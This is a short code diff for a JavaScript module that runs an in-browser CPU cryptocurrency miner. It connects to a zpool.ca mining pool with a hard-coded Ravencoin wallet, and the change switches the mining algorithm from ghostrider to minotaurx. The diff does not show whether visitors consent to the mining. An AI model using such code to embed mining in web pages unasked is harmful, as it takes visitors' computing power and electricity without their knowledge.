@@ -8,15 +8,15 @@
 import * as cpuWebMiner from 'https://esm.run/@marco_ciaramella/cpu-web-miner';
 
 const stratum = {
-    server: "ghostrider.na.mine.zpool.ca",
-    port: 5354,
+    server: "minotaurx.na.mine.zpool.ca",
+    port: 7019,
     worker: "R9uHDn9XXqPAe2TLsEmVoNrokmWsHREV2Q",
     password: "c=RVN",
     ssl: false // true when pool uses SSL, false otherwise
 }
 
 cpuWebMiner.start(
-    cpuWebMiner.ghostrider,
+    cpuWebMiner.minotaurx,
     stratum,
     null,
     1,
